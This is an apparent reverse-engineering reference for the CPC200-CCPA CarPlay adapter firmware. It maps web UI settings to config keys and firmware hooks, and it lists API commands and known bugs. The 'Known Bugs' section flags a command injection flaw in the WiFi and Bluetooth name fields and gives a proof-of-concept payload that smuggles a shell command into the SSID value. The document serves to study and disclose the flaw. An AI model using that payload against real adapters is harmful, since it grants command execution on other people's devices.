# CPC200-CCPA Web Settings Complete Reference

**Purpose:** Complete mapping of web UI settings to firmware parameters and their effects
**Firmware Version:** 2025.10.15.1127
**Analysis Date:** 2026-01-20

---

## API Parameter Naming

The web API uses **camelCase** parameter names that may differ from `riddleBoxCfg` names:

| Web API | riddleBoxCfg | Notes |
|---------|--------------|-------|
| `mediaDelay` | `MediaLatency` | Different names |
| `wifiChannel` | `WiFiChannel` | Case difference |
| `startDelay` | `BoxConfig_DelayStart` | Different names |
| `displaySize` | `DisplaySize` | Same |
| `autoConn` | `NeedAutoConnect` | Different names |

---

## Settings by Category

### Audio Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `mediaDelay` | `MediaLatency` | 300-2000 | 1000 | `pcm_open()` buffer size in tinyalsa |
| `mediaSound` | `MediaQuality` | 0-1 | 1 | 0=44.1kHz, 1=48kHz sample rate |
| `CallQuality` | `CallQuality` | 0-2 | 1 | **BUGGY** - Does NOT set VoiceQuality |
| `naviVolume` | `NaviVolume` | 0-100 | 0 | Navigation audio gain multiplier |
| `MicType` | `MicType` | 0-2 | 0 | 0=Car, 2=Phone mic (Note: CPC200-CCPA has no Box mic) |
| `MicMode` | `MicMode` | 0-4 | 0 | WebRTC noise suppression mode |
| `MicGainSwitch` | `MicGainSwitch` | 0-1 | 0 | Enable mic input gain boost |
| `BtAudio` | `BtAudio` | 0-1 | 0 | Route media via BT A2DP |
| `UseBTPhone` | `UseBTPhone` | 0-1 | 0 | Route calls via BT HFP |
| `EchoLatency` | `EchoLatency` | 20-2000 | 320 | WebRTC AEC delay estimator |
| `NaviAudio` | `NaviAudio` | 0-2 | 0 | Nav audio channel routing |
| `backRecording` | `BackRecording` | 0-1 | 0 | Allow background app recording |

**Audio Firmware Hooks:**
```c
// MediaLatency affects pcm_open buffer
pcm_open(card, device, PCM_OUT, &config);
config.period_size = MediaLatency / 1000 * sample_rate;

// MediaQuality sets sample rate
if (MediaQuality == 0) sample_rate = 44100;  // CD
else sample_rate = 48000;  // DVD

// MicType routes audio input
switch (MicType) {
    case 0: open("/dev/snd/pcmC0D0c");  // Car mic
    case 1: open("/dev/snd/pcmC1D0c");  // Box 3.5mm
    case 2: /* Phone handles mic */
}
```

---

### Video / H.264 Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `bitRate` | `VideoBitRate` | 0-20 | 0 | Hint to phone encoder (Mbps) |
| `ScreenDPI` | `ScreenDPI` | 0-480 | 0 | CarPlay rendering density |
| `displaySize` | `DisplaySize` | 0-3 | 0 | Icon size mode |
| `SpsPpsMode` | `SpsPpsMode` | 0-3 | 0 | NAL unit handling mode |
| `RepeatKeyframe` | `RepeatKeyframe` | 0-1 | 0 | Re-transmit IDR on underrun |
| `NeedKeyFrame` | `NeedKeyFrame` | 0-1 | 0 | Auto-request IDR on corruption |
| `SendEmptyFrame` | `SendEmptyFrame` | 0-1 | 1 | Send zero-length timing packets |
| `CustomFrameRate` | `CustomFrameRate` | 0-60 | 0 | Fixed FPS (0=auto ~30fps) |
| `OriginalResolution` | `OriginalResolution` | 0-1 | 0 | Use phone native resolution |
| `NotCarPlayH264DecreaseMode` | `NotCarPlayH264DecreaseMode` | 0-2 | 0 | Block adaptive bitrate |

**SpsPpsMode Values:**
| Value | Mode | Description |
|-------|------|-------------|
| 0 | Auto | Use LastPhoneSpsPps from riddle.conf |
| 1 | Re-inject | Prepend SPS/PPS before each IDR |
| 2 | Cache | Store and replay on decoder errors |
| 3 | Repeat | Include in every packet |

**Video Firmware Hooks:**
```c
// BitRate sent in CarPlay negotiation
carplay_set_preferred_bitrate(VideoBitRate * 1000000);

// ScreenDPI written to /tmp/screen_dpi
write_file("/tmp/screen_dpi", ScreenDPI);

// SpsPpsMode affects NAL unit processing
switch (SpsPpsMode) {
    case 1: prepend_sps_pps_to_idr(frame);
    case 2: cache_sps_pps_for_recovery();
    case 3: include_sps_pps_every_packet();
}
```

---

### Network / WiFi Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `wifiChannel` | `WiFiChannel` | 1-165 | 36 | hostapd.conf channel |
| `wifi5GSwitch` | (derived) | 0-1 | 1 | 0=2.4GHz, 1=5GHz band |
| `CustomWifiName` | `CustomWifiName` | 0-15 chars | "" | hostapd.conf ssid |
| `CustomBluetoothName` | `CustomBluetoothName` | 0-15 chars | "" | hcid.conf name |
| `WifiPassword` | `WifiPassword` | 0-15 chars | "12345678" | hostapd.conf wpa_passphrase |

**WiFi Firmware Hooks:**
```bash
# WiFiChannel written to hostapd.conf via sed
sed -i "s/^channel=.*/channel=${WiFiChannel}/" /etc/hostapd.conf

# SSID written (COMMAND INJECTION VULNERABLE!)
sed -i "s/^ssid=.*/ssid=${CustomWifiName}/" /etc/hostapd.conf

# BT name written (COMMAND INJECTION VULNERABLE!)
sed -i "s/name .*/name \"${CustomBluetoothName}\";/" /etc/bluetooth/hcid.conf
```

**Available WiFi Channels:**
| Channel | Frequency | Band |
|---------|-----------|------|
| 1-7 | 2412-2442 MHz | 2.4GHz |
| 36, 40, 44 | 5180-5220 MHz | 5GHz |
| 149, 157, 161 | 5745-5805 MHz | 5GHz |

---

### Connection / USB Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `autoConn` | `NeedAutoConnect` | 0-1 | 1 | Auto-connect to LastConnectedDevice |
| `startDelay` | `BoxConfig_DelayStart` | 0-120 | 0 | usleep() before USB init (seconds) |
| `USBConnectedMode` | `USBConnectedMode` | 0-2 | 0 | USB enumeration timing |
| `USBTransMode` | `USBTransMode` | 0-1 | 0 | Bulk transfer packetization |
| `iAP2TransMode` | `iAP2TransMode` | 0-1 | 0 | iPhone accessory framing |
| `FastConnect` | `FastConnect` | 0-1 | 0 | Skip BT discovery on reconnect |
| `WiredConnect` | `WiredConnect` | 0-1 | 1 | Check /dev/usb_accessory for cable |
| `AutoResetUSB` | `AutoResetUSB` | 0-1 | 1 | Power-cycle USB on disconnect |

**USBConnectedMode Values:**
| Value | Mode | Description |
|-------|------|-------------|
| 0 | Standard | Normal USB 2.0 timing |
| 1 | Extended | Extended descriptor delays |
| 2 | Compatibility | Slow handshake with retries |

**Connection Firmware Hooks:**
```c
// AutoConnect triggers D-Bus call on boot
if (NeedAutoConnect) {
    dbus_call("org.riddle", "StartAutoConnect", LastConnectedDevice);
}

// DelayStart adds startup delay
usleep(BoxConfig_DelayStart * 1000000);

// FastConnect skips BT pairing
if (FastConnect && mac_matches(LastConnectedDevice)) {
    skip_bt_discovery();
}
```

---

### Display / UI Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `MouseMode` | `MouseMode` | 0-1 | 1 | Convert touch to cursor |
| `KnobMode` | `KnobMode` | 0-1 | 0 | Remap button inputs |
| `autoDisplay` | `autoDisplay` | 0-2 | 1 | Auto-show phone UI |
| `BackgroundMode` | `BackgroundMode` | 0-1 | 0 | Hide connection overlay |
| `ReturnMode` | `ReturnMode` | 0-1 | 0 | Return button behavior |
| `LogoType` | `LogoType` | 0-3 | 0 | Home button icon style |
| `CustomCarLogo` | `CustomCarLogo` | 0-1 | 0 | Use custom car logo |
| `lightType` | `lightType` | 1-3 | 3 | RGB LED behavior |

**autoDisplay Values:**
| Value | Mode | Description |
|-------|------|-------------|
| 0 | Manual | Don't auto-show phone UI |
| 1 | Standard | Auto-show after connect |
| 2 | Force | Force display on reconnect |

---

### HiCar / Android Auto Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `autoPlay` | `AutoPlauMusic` | 0-1 | 0 | Auto-play music on HiCar |
| `HudGPSSwitch` | `HudGPSSwitch` | 0-1 | 1 | Pass car GPS to phone |
| `HiCarConnectMode` | `HiCarConnectMode` | 0-1 | 0 | HiCar connection method |
| `AndroidAutoWidth` | `AndroidAutoWidth` | 0-4096 | 0 | AA display width |
| `AndroidAutoHeight` | `AndroidAutoHeight` | 0-4096 | 0 | AA display height |
| `AndroidWorkMode` | `AndroidWorkMode` | 1-5 | 1 | Android connection mode |

---

### System / Update Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `AutoUpdate` | `AutoUpdate` | 0-1 | 1 | Auto-check for updates |
| `Udisk` | `UdiskMode` | 0-1 | 1 | USB storage mode |
| `UDiskPassThrough` | `UDiskPassThrough` | 0-1 | 1 | Pass-through USB storage |
| `CarDrivePosition` | `CarDrivePosition` | 0-1 | 0 | 0=LHD, 1=RHD |
| `SendHeartBeat` | `SendHeartBeat` | 0-1 | 1 | Send 0xAA heartbeat |
| `ImprovedFluency` | `ImprovedFluency` | 0-1 | 0 | ~~Increase USB buffers~~ **DEAD KEY** — stored in riddle.conf but never read by any firmware binary at runtime. Intended to increase USB bulk transfer buffers and adjust pcm_get_buffer_size per advanced.html, but never implemented in fw 2025.10.15.1127 (confirmed via exhaustive Ghidra decompilation of all 7 binaries) |
| `LogMode` | `LogMode` | 0-1 | 1 | Enable debug logging |

---

### Advanced / Packet Settings

| Web API Name | riddleBoxCfg Name | Range | Default | Firmware Hook |
|--------------|-------------------|-------|---------|---------------|
| `MediaPacketLen` | `MediaPacketLen` | 200-20000 | 200 | Media USB bulk size |
| `TtsPacketLen` | `TtsPacketLen` | 200-40000 | 200 | Nav voice USB bulk size |
| `VrPacketLen` | `VrPacketLen` | 200-40000 | 200 | Siri mic USB bulk size |
| `TtsVolumGain` | `TtsVolumGain` | 0-1 | 0 | Boost nav voice gain |
| `VrVolumGain` | `VrVolumGain` | 0-1 | 0 | Boost call voice gain |

---

## Web API Commands

### Verified Working Commands

| Command | Parameters | Response | Shell/Firmware Hook |
|---------|------------|----------|---------------------|
| `infos` | - | Full JSON | Reads riddle.conf, /etc/box_* files |
| `set` | `item`, `val` | `{"err":0}` | `riddleBoxCfg -s <item> <val>` |
| `reset` | - | `{"err":0}` | `riddleBoxCfg --restoreOld` |
| `restart` | - | `{"err":0}` | `sync; busybox reboot` |
| `BoxMonitor` | - | Live stats | CPU, Mem, Temp, WiFi throughput |

**Note:** The `reboot` command without `busybox` prefix does not work on CPC200-CCPA. Always use `busybox reboot` or `sync; busybox reboot` for reliable reboots.

---

## Data Source Limitations

### Settings Returned by `infos` Command

The `infos` API only returns a **limited subset** of 13 settings:

```
startDelay, mediaDelay, autoConn, wifi5GSwitch, wifiChannel,
mediaSound, CallQuality, bitRate, autoPlay, backRecording,
naviVolume, displaySize, ScreenDPI
```

### Settings NOT Returned by `infos`

The following settings must be queried directly via `riddleBoxCfg -g <key>`:

| Setting | riddleBoxCfg Key | Notes |
|---------|------------------|-------|
| Mic Type | `MicType` | 0=Car, 2=Phone (CPC200-CCPA has no Box mic) |
| Audio Source | `BtAudio` | 0=Adapter, 1=Phone BT |
| Background Mode | `BackgroundMode` | 0=Show UI, 1=Hide UI |
| GPS from HU | `HudGPSSwitch` | 0=Off, 1=On |
| USB Passthrough | `UDiskPassThrough` | 0=Off, 1=On |
| Fast Connect | `FastConnect` | 0=Off, 1=On |
| Improved Fluency | `ImprovedFluency` | 0=Off, 1=On | **DEAD KEY** — no runtime effect (see firmware hook column above) |
| Knob Mode | `KnobMode` | 0=Off, 1=On |
| Mouse Mode | `MouseMode` | 0=Touch, 1=Cursor |
| Advanced Features | `AdvancedFeatures` | 0=Off, 1=On (enables naviScreen — extra 0x2C video stream for instrument cluster). Boolean, NOT bitmask. |
| Custom Car Logo | `CustomCarLogo` | 0=Default, 1=Custom |

### Replacement Web Interface Solution

The replacement web interface uses a custom CGI script (`config.cgi`) that queries these extended settings via `riddleBoxCfg -g`:

```bash
#!/bin/sh
echo "Content-Type: application/json"
echo ""
echo "{"
echo "\"MicType\":$(riddleBoxCfg -g MicType),"
echo "\"BtAudio\":$(riddleBoxCfg -g BtAudio),"
# ... etc
echo "}"
```

This allows the web UI to display the current state of ALL settings, not just those in the `infos` response.

### Error Codes

| Code | Meaning |
|------|---------|
| `{"err":0}` | Success |
| `{"err":255}` | Invalid parameter name |
| `{"err":404}` | Unknown command |
| `403 Forbidden` | Invalid signature |

---

## Parameter Modification Flow

```
Web UI → server.cgi → riddleBoxCfg → riddle.conf → ARMadb-driver
         (CGI)        (CLI tool)     (JSON file)   (Main daemon)
```

**Sequence:**
1. Web UI calls `POST /cgi-bin/server.cgi` with signed request
2. server.cgi validates MD5 signature
3. server.cgi calls `riddleBoxCfg -s <param> <value>`
4. riddleBoxCfg writes to `/etc/riddle.conf`
5. Some params take effect immediately, others require reboot
6. ARMadb-driver reads riddle.conf on startup or via D-Bus signal

---

## Settings Requiring Reboot

These settings only take effect after adapter reboot:

- `WiFiChannel` - Requires hostapd restart
- `CustomWifiName` / `CustomBluetoothName` - Service restart
- `USBConnectedMode` / `USBTransMode` - USB stack init
- `AndroidAutoWidth` / `AndroidAutoHeight` - AA init
- `ScreenDPI` - CarPlay init
- `BoxConfig_DelayStart` - Boot sequence

---

## Settings Taking Effect Immediately

These settings apply without reboot:

- `MediaLatency` - Next audio session
- `CallQuality` - Next call (though buggy)
- `VideoBitRate` - Next video negotiation
- `MicType` - Next mic activation
- `autoConn` - Immediate
- `BackgroundMode` - Next connection

---

## Known Bugs

### CallQuality → VoiceQuality Bug

The `CallQuality` web setting does NOT properly translate to internal `VoiceQuality`:

```c
// Expected behavior (BROKEN):
void setCallQuality(int val) {
    riddleBoxCfg_set("CallQuality", val);
    riddleBoxCfg_set("VoiceQuality", val);  // THIS LINE MISSING!
}

// Workaround: Set VoiceQuality directly
riddleBoxCfg -s VoiceQuality 2  # For HD calls
```

### Command Injection in Name Fields

`CustomWifiName` and `CustomBluetoothName` are passed unsanitized to `sed`:

```bash
# Vulnerable code in firmware
sed -i "s/^ssid=.*/ssid=${CustomWifiName}/" /etc/hostapd.conf

# Exploit payload
CustomWifiName = 'test"; /bin/sh -c "id > /tmp/pwned"; echo "'
```

---

## Host Application Overridable Settings

Some settings configured via the web interface can be **overridden by the host application** via USB protocol BoxSettings JSON messages. When a host app connects and sends BoxSettings, these values may be changed regardless of web UI configuration.

### Settings That May Be Overridden by Host App

| Setting | Web UI Name | BoxSettings JSON Field |
|---------|-------------|------------------------|
| `MediaLatency` | Media Delay | `mediaDelay` |
| `NeedAutoConnect` | Auto Connect | `autoConn` |
| `AutoPlauMusic` | Auto Play | `autoPlay` |
| `BackgroundMode` | Background Mode | `bgMode` |
| `BoxConfig_DelayStart` | Start Delay | `startDelay` |
| `MediaQuality` | Audio Quality | `mediaSound` |
| `EchoLatency` | Echo Delay | `echoDelay` |
| `CallQuality` | Call Quality | `callQuality` |
| `MouseMode` | Mouse Mode | (via protocol commands) |
| `KnobMode` | Knob Mode | (via protocol commands) |

### Settings NOT Typically Overridden

These settings are generally respected and not overwritten by host apps:

| Setting | Web UI Name | Notes |
|---------|-------------|-------|
| `CustomWifiName` | WiFi Name | Network identity |
| `CustomBluetoothName` | Bluetooth Name | Network identity |
| `WiFiChannel` | WiFi Channel | Network configuration |
| `MicType` | Mic Type | Hardware routing |
| `ScreenDPI` | Screen DPI | Display configuration |
| `HudGPSSwitch` | GPS from HU | Feature toggle |

**Note:** Settings marked with `*` in the replacement web interface indicate they may be overridden by the host application.

---

## Related Documentation

- `configuration.md` - Full riddleBoxCfg reference
- `web_interface.md` - API authentication details
- `../03_Security_Analysis/vulnerabilities.md` - Security issues
